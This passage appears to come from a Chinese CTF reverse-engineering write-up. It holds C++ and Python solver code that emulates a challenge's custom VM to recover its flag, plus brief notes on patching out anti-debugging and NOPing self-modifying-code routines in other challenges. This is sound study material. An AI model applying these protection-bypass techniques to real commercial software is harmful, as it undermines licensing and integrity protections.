<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> opcode[<span class="number">4</span>][<span class="number">15</span>] = </span><br><span class="line">&#123;</span><br><span class="line">  &#123;<span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x18</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x03</span>&#125;, </span><br><span class="line">  &#123;<span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x18</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x18</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x05</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x06</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp[<span class="number">4</span>][<span class="number">15</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> vm_body[<span class="number">6</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *reg;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> algn[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">vm</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  algn[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  algn[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(i &lt; <span class="number">15</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      reg = op + i;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> eax = reg[<span class="number">1</span>];</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> ebx = reg[<span class="number">1</span>];</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> ecx = reg[<span class="number">2</span>];</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> edx = reg[<span class="number">2</span>];</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> v11, v12, v13, v14, v15, v16;</span><br><span class="line">      <span class="comment">//for(int j = 0; j &lt; 15; j++)printf(&quot;%d &quot;, op[j]);</span></span><br><span class="line">      <span class="comment">//printf(&quot;i = %d reg[0] = %d\n&quot;, i, reg[0]);</span></span><br><span class="line">      <span class="comment">//printf(&quot;ebx = %d, ecx = %d\n&quot;, ebx, ecx);</span></span><br><span class="line">      <span class="keyword">switch</span>(reg[<span class="number">0</span>])</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">          v11 = vm_body[ebx];</span><br><span class="line">                vm_body[ebx] = vm_body[edx];</span><br><span class="line">                vm_body[edx] = v11;</span><br><span class="line">                algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">                i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              	vm_body[ebx] ^= vm_body[ecx];<span class="comment">//printf(&quot;vm_body[ebx] ^= vm_body[ecx];\n&quot;);</span></span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              	vm_body[ebx] += ecx;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">              	vm_body[ebx] += vm_body[ecx];</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">              	vm_body[ebx] -= ecx;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">              	vm_body[ebx] -= vm_body[ecx];</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">              	vm_body[ebx] *= ecx;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">              	vm_body[ebx] *= vm_body[ecx];</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">              	vm_body[ebx] = (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[ebx] / ecx;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">              	vm_body[ebx] = (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[ebx] / (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[ecx];</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">              	vm_body[ebx] = (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[ebx] % ecx;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">              	vm_body[ebx] = (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[ebx] % (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[ecx];</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">              	v12 = (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[ebx];</span><br><span class="line">              	vm_body[ebx] = v12 &lt;&lt; ecx;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">              	v12 = (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[<span class="number">0</span>];</span><br><span class="line">              	vm_body[ebx] = v12 &lt;&lt; ecx;<span class="comment">//printf(&quot;vm_body[ebx] = (unsigned char)vm_body[0] &lt;&lt; ecx;\n&quot;);</span></span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">              	v15 = vm_body[ebx];</span><br><span class="line">          vm_body[algn[<span class="number">0</span>] + <span class="number">16</span>] = v15;</span><br><span class="line">              	algn[<span class="number">0</span>] = algn[<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">              	v13 = (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[ebx];</span><br><span class="line">              	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v13);</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">              	v14 = algn[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">              	algn[<span class="number">0</span>] = algn[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">              	v13 = vm_body[v14 + <span class="number">16</span>];</span><br><span class="line">              	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v13);</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">              	<span class="keyword">if</span> ( !vm_body[ebx] )</span><br><span class="line">                &#123;</span><br><span class="line">                	algn[<span class="number">1</span>] = ecx;</span><br><span class="line">              		algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              		i = algn[<span class="number">1</span>];</span><br><span class="line">                  <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">continue</span>;</span><br><span class="line">              	&#125;</span><br><span class="line">              	<span class="keyword">else</span> algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">              	<span class="keyword">if</span> ( vm_body[ebx] )</span><br><span class="line">                algn[<span class="number">1</span>] = ecx;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">              	algn[<span class="number">1</span>] = eax;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">              	ebx = (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[ebx];</span><br><span class="line">              	v15 = vm_body[ebx];</span><br><span class="line">          vm_body[algn[<span class="number">0</span>] + <span class="number">16</span>] = v15;</span><br><span class="line">              	algn[<span class="number">0</span>] = algn[<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">              	v16 = algn[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">              	algn[<span class="number">0</span>] = algn[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">              	vm_body[<span class="number">0</span>] = vm_body[v16 + <span class="number">16</span>];</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">              	v15 = eax;</span><br><span class="line">              	vm_body[algn[<span class="number">0</span>] + <span class="number">16</span>] = v15;</span><br><span class="line">              	algn[<span class="number">0</span>] = algn[<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">              	<span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                	<span class="keyword">break</span>;</span><br><span class="line">              	<span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">            	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">              	vm_body[<span class="number">0</span>] = vm_body[<span class="number">2</span>] | vm_body[<span class="number">1</span>];<span class="comment">//printf(&quot;vm_body[0] = vm_body[2] | vm_body[1];\n&quot;);</span></span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">            	vm_body[ebx] = (<span class="type">unsigned</span> <span class="type">char</span>)vm_body[<span class="number">0</span>] &gt;&gt; ecx;<span class="comment">//printf(&quot;vm_body[ebx] = (unsigned char)vm_body[0] &gt;&gt; ecx;\n&quot;);</span></span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line">              	vm_body[ebx] = ecx;<span class="comment">//printf(&quot;vm_body[ebx] = ecx;\n&quot;);</span></span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">continue</span>;   </span><br><span class="line">            <span class="keyword">default</span>:    </span><br><span class="line">              	algn[<span class="number">1</span>] += <span class="number">3</span>;</span><br><span class="line">              	i = algn[<span class="number">1</span>];</span><br><span class="line">              	<span class="keyword">if</span> ( algn[<span class="number">1</span>] &gt;= <span class="number">15</span> )</span><br><span class="line">                	<span class="keyword">break</span>;</span><br><span class="line">              	<span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">15</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      tmp[i][j] = opcode[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> len = <span class="number">29</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">233</span>] = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_&quot;</span>;</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;vm_body[<span class="number">3</span>] = <span class="number">0xBEEDBEEF</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">65</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a = flag[i];</span><br><span class="line">    tmp[<span class="number">0</span>][<span class="number">2</span>] = flag[i];</span><br><span class="line">    <span class="built_in">vm</span>(tmp[<span class="number">0</span>]);</span><br><span class="line">    tmp[<span class="number">1</span>][<span class="number">2</span>] = vm_body[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">vm</span>(tmp[<span class="number">1</span>]);</span><br><span class="line">    tmp[<span class="number">2</span>][<span class="number">2</span>] = vm_body[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">vm</span>(tmp[<span class="number">2</span>]);</span><br><span class="line">    tmp[<span class="number">3</span>][<span class="number">2</span>] = vm_body[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">vm</span>(tmp[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">//printf(&quot;vm_body[0] = %d\n&quot;, vm_body[0]);</span></span><br><span class="line">    </span><br><span class="line">    flag[i] = ((<span class="type">unsigned</span> <span class="type">char</span>)vm_body[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * vm_body[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x : \&quot;%c\&quot;, &quot;</span>, flag[i], a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0xDF</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0xA1</span>, <span class="number">0xA5</span>, <span class="number">0x89</span>, <span class="number">0xBD</span>,</span><br><span class="line">  <span class="number">0xE9</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x9D</span>, <span class="number">0xE9</span>, <span class="number">0xB3</span>, <span class="number">0x85</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0xBF</span>,</span><br><span class="line">  <span class="number">0xE9</span>, <span class="number">0xB1</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, <span class="number">0x91</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8F</span>, <span class="number">0xAD</span>]</span><br><span class="line"></span><br><span class="line">mp = &#123;<span class="number">0x35</span> : <span class="string">&quot;1&quot;</span>, <span class="number">0x33</span> : <span class="string">&quot;2&quot;</span>, <span class="number">0x31</span> : <span class="string">&quot;3&quot;</span>, <span class="number">0x3f</span> : <span class="string">&quot;4&quot;</span>, <span class="number">0x3d</span> : <span class="string">&quot;5&quot;</span>, <span class="number">0x3b</span> : <span class="string">&quot;6&quot;</span>, <span class="number">0x39</span> : <span class="string">&quot;7&quot;</span>, <span class="number">0x27</span> : <span class="string">&quot;8&quot;</span>, <span class="number">0x25</span> : <span class="string">&quot;9&quot;</span>, <span class="number">0x37</span> : <span class="string">&quot;0&quot;</span>, <span class="number">0x95</span> : <span class="string">&quot;a&quot;</span>, <span class="number">0x93</span> : <span class="string">&quot;b&quot;</span>, <span class="number">0x91</span> : <span class="string">&quot;c&quot;</span>, <span class="number">0x9f</span> : <span class="string">&quot;d&quot;</span>, <span class="number">0x9d</span> : <span class="string">&quot;e&quot;</span>, <span class="number">0x9b</span> : <span class="string">&quot;f&quot;</span>, <span class="number">0x99</span> : <span class="string">&quot;g&quot;</span>, <span class="number">0x87</span> : <span class="string">&quot;h&quot;</span>, <span class="number">0x85</span> : <span class="string">&quot;i&quot;</span>, <span class="number">0x83</span> : <span class="string">&quot;j&quot;</span>, <span class="number">0x81</span> : <span class="string">&quot;k&quot;</span>, <span class="number">0x8f</span> : <span class="string">&quot;l&quot;</span>, <span class="number">0x8d</span> : <span class="string">&quot;m&quot;</span>, <span class="number">0x8b</span> : <span class="string">&quot;n&quot;</span>, <span class="number">0x89</span> : <span class="string">&quot;o&quot;</span>, <span class="number">0xb7</span> : <span class="string">&quot;p&quot;</span>, <span class="number">0xb5</span> : <span class="string">&quot;q&quot;</span>, <span class="number">0xb3</span> : <span class="string">&quot;r&quot;</span>, <span class="number">0xb1</span> : <span class="string">&quot;s&quot;</span>, <span class="number">0xbf</span> : <span class="string">&quot;t&quot;</span>, <span class="number">0xbd</span> : <span class="string">&quot;u&quot;</span>, <span class="number">0xbb</span> : <span class="string">&quot;v&quot;</span>, <span class="number">0xb9</span> : <span class="string">&quot;w&quot;</span>, <span class="number">0xa7</span> : <span class="string">&quot;x&quot;</span>, <span class="number">0xa5</span> : <span class="string">&quot;y&quot;</span>, <span class="number">0xa3</span> : <span class="string">&quot;z&quot;</span>, <span class="number">0xd5</span> : <span class="string">&quot;A&quot;</span>, <span class="number">0xd3</span> : <span class="string">&quot;B&quot;</span>, <span class="number">0xd1</span> : <span class="string">&quot;C&quot;</span>, <span class="number">0xdf</span> : <span class="string">&quot;D&quot;</span>, <span class="number">0xdd</span> : <span class="string">&quot;E&quot;</span>, <span class="number">0xdb</span> : <span class="string">&quot;F&quot;</span>, <span class="number">0xd9</span> : <span class="string">&quot;G&quot;</span>, <span class="number">0xc7</span> : <span class="string">&quot;H&quot;</span>, <span class="number">0xc5</span> : <span class="string">&quot;I&quot;</span>, <span class="number">0xc3</span> : <span class="string">&quot;J&quot;</span>, <span class="number">0xc1</span> : <span class="string">&quot;K&quot;</span>, <span class="number">0xcf</span> : <span class="string">&quot;L&quot;</span>, <span class="number">0xcd</span> : <span class="string">&quot;M&quot;</span>, <span class="number">0xcb</span> : <span class="string">&quot;N&quot;</span>, <span class="number">0xc9</span> : <span class="string">&quot;O&quot;</span>, <span class="number">0xf7</span> : <span class="string">&quot;P&quot;</span>, <span class="number">0xf5</span> : <span class="string">&quot;Q&quot;</span>, <span class="number">0xf3</span> : <span class="string">&quot;R&quot;</span>, <span class="number">0xf1</span> : <span class="string">&quot;S&quot;</span>, <span class="number">0xff</span> : <span class="string">&quot;T&quot;</span>, <span class="number">0xfd</span> : <span class="string">&quot;U&quot;</span>, <span class="number">0xfb</span> : <span class="string">&quot;V&quot;</span>, <span class="number">0xf9</span> : <span class="string">&quot;W&quot;</span>, <span class="number">0xe7</span> : <span class="string">&quot;X&quot;</span>, <span class="number">0xe5</span> : <span class="string">&quot;Y&quot;</span>, <span class="number">0xe3</span> : <span class="string">&quot;Z&quot;</span>, <span class="number">0xa1</span> : <span class="string">&quot;&#123;&quot;</span>, <span class="number">0xad</span> : <span class="string">&quot;&#125;&quot;</span>, <span class="number">0xe9</span> : <span class="string">&quot;_&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(mp[i],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="csgo"><a class="markdownIt-Anchor" href="#csgo">#</a> CSGO</h3>
<p>patch 反调试，动调获取 base 变表直接在线解即可<br>
表：LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJK</p>
<h3 id="babyobfu"><a class="markdownIt-Anchor" href="#babyobfu">#</a> babyobfu</h3>
<p>赛中的零解题，结果回来看真的不那么难…</p>
<p>​	比较明显的有两种 smc，一种解密后续代码，一种加密前面的代码；后续询问了出题人，这里的 smc 粒度是基本块，量较大</p>
<p>​	有一个很直观的思路，就是把解密后续代码的 <code>smc1</code>  执行后 nop 掉，全局 nop 掉加密前面代码的 <code>smc2</code> ，初始化 smc 数据的函数可以不处理</p>
<p>其实只需要这一句即可：</p>
